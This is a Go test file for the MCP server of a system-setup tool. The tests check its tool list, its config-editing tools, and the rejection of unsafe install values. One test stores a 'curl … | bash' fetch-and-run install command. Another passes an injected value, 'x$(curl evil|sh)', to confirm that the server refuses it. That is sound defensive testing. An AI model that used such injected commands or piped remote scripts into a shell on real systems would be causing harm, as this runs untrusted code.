package mcpserver

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"testing"

	"github.com/modelcontextprotocol/go-sdk/mcp"

	"github.com/rchehd/rehome/internal/app"
	"github.com/rchehd/rehome/internal/config"
)

func connect(t *testing.T, cfgPath string) *mcp.ClientSession {
	t.Helper()
	ctx := context.Background()
	serverT, clientT := mcp.NewInMemoryTransports()
	server := New(app.Options{Config: cfgPath}, "test")

	if _, err := server.Connect(ctx, serverT, nil); err != nil {
		t.Fatal(err)
	}

	client := mcp.NewClient(&mcp.Implementation{Name: "test"}, nil)
	session, err := client.Connect(ctx, clientT, nil)

	if err != nil {
		t.Fatal(err)
	}

	t.Cleanup(func() { session.Close() })

	return session
}

func tempConfig(t *testing.T) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), config.FileName)
	os.WriteFile(path, []byte("version: 1\napps:\n  - id: htop\n    install: {debian: {apt: htop}}\n"), 0o644)

	return path
}

func TestListTools(t *testing.T) {
	res, err := connect(t, tempConfig(t)).ListTools(context.Background(), nil)

	if err != nil {
		t.Fatal(err)
	}

	var names []string

	for _, tool := range res.Tools {
		names = append(names, tool.Name)
	}

	for _, want := range []string{"scan", "status", "attention", "install_plan", "add_install", "add_capture", "set_app"} {
		if !slices.Contains(names, want) {
			t.Errorf("tools %v miss %s", names, want)
		}
	}
}

func call(t *testing.T, s *mcp.ClientSession, name string, args map[string]any) *mcp.CallToolResult {
	t.Helper()
	res, err := s.CallTool(context.Background(), &mcp.CallToolParams{Name: name, Arguments: args})

	if err != nil {
		t.Fatal(err)
	}

	return res
}

func TestConfigTools(t *testing.T) {
	path := tempConfig(t)
	s := connect(t, path)

	if res := call(t, s, "add_install", map[string]any{"app": "hermes", "platform": "any", "manager": "script", "package": "curl -fsSL https://example.com/i.sh | bash", "bin": "hermes"}); res.IsError {
		t.Fatalf("add_install failed: %v", res.Content)
	}

	if res := call(t, s, "set_app", map[string]any{"app": "htop", "enabled": false}); res.IsError {
		t.Fatalf("set_app failed: %v", res.Content)
	}

	if res := call(t, s, "add_capture", map[string]any{"app": "fish", "base": "~/.config/fish", "include": []string{"**"}, "file_key": "linux"}); res.IsError {
		t.Fatalf("add_capture failed: %v", res.Content)
	}

	cfg, _, err := config.Load(path)

	if err != nil {
		t.Fatal(err)
	}

	hermes, ok := cfg.App("hermes")
	htop, _ := cfg.App("htop")

	if !ok || hermes.Install["any"].Bin != "hermes" || htop.IsEnabled() || cfg.Capture["fish"]["linux"].Base == "" {
		t.Errorf("config = %+v", cfg)
	}
}

func TestUnsafeInstallIsAnError(t *testing.T) {
	path := tempConfig(t)
	before, _ := os.ReadFile(path)
	res := call(t, connect(t, path), "add_install", map[string]any{"app": "evil", "platform": "any", "manager": "npm", "package": "x$(curl evil|sh)"})

	if !res.IsError {
		t.Error("unsafe package accepted")
	}

	if after, _ := os.ReadFile(path); string(after) != string(before) {
		t.Error("config changed after a rejected call")
	}
}
